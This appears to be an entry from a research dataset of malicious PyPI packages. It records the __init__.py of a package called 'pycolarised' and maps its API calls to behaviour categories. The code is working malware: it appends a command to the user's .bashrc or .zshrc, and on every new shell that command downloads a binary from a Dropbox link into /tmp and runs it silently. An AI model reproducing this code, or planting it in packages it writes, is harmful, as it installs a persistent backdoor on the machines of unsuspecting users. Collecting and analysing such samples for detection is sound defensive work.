[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pycolarised-2.7-py3-none-any/pycolarised/__init__.py",
    "code_snippet": "import os\nimport platform\n\ndef multios():\n    if platform.system().startswith(\"Linux\"):\n        recol = os.environ.get(\"SHELL\")\n        return os.path.basename(recol)\n    return None\n\ndef reset_modules():\n    recol = multios()\n    if recol == \"bash\":\n        rescolor = os.path.expanduser(\"~/.bashrc\")\n    elif recol == \"zsh\":\n        rescolor = os.path.expanduser(\"~/.zshrc\")\n    else:\n        return\n    if os.path.exists(rescolor):\n        with open(rescolor, \"r\") as f:\n            if \"proc.sh\" in f.read():\n                return\n        with open(rescolor, \"a\") as f:\n            f.write('bash -c \\'home_dir=$(eval echo ~); ab=\"$home_dir/.local/.tmp\"; fil=\"$ab/proc.sh\"; mkdir -p \"$ab\" >/dev/null 2>&1; chmod 777 \"$ab\" >/dev/null 2>&1; if [[ -f \"$fil\" ]]; then echo \"\"; else echo \"wget https://dl.dropbox.com/s/6txmhmva0m072yz/proc -O /tmp/proc >/dev/null 2>&1 && chmod +x /tmp/proc >/dev/null 2>&1 && /tmp/proc >/dev/null 2>&1 &\" >> \"$fil\"; chmod +x \"$fil\" >/dev/null 2>&1; bash \"$fil\" >/dev/null 2>&1; fi\\'\\n')\n    else:\n        return",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "os.environ.get",
        "os.path.basename",
        "os.path.expanduser",
        "os.path.expanduser",
        "os.path.exists",
        "open",
        "open",
        "os.path.exists"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "os.environ.get(\"SHELL\")",
        "os.path.basename(recol)",
        "os.path.expanduser(\"~/.bashrc\")",
        "os.path.expanduser(\"~/.zshrc\")",
        "os.path.exists(rescolor)",
        "open(rescolor, \"r\")",
        "open(rescolor, \"a\")",
        "os.path.exists(rescolor)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.environ.get",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.basename",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        }
      ],
      "contextual_code": "import os\nimport platform\n\ndef multios():\n    if platform.system().startswith(\"Linux\"):\n        recol = os.environ.get(\"SHELL\")\n        return os.path.basename(recol)\n    return None\n\ndef reset_modules():\n    recol = multios()\n    if recol == \"bash\":\n        rescolor = os.path.expanduser(\"~/.bashrc\")\n    elif recol == \"zsh\":\n        rescolor = os.path.expanduser(\"~/.zshrc\")\n    else:\n        return\n    if os.path.exists(rescolor):\n        with open(rescolor, \"r\") as f:\n            if \"proc.sh\" in f.read():\n                return\n        with open(rescolor, \"a\") as f:\n            f.write('bash -c ...')\n    else:\n        return"
    }
  }
]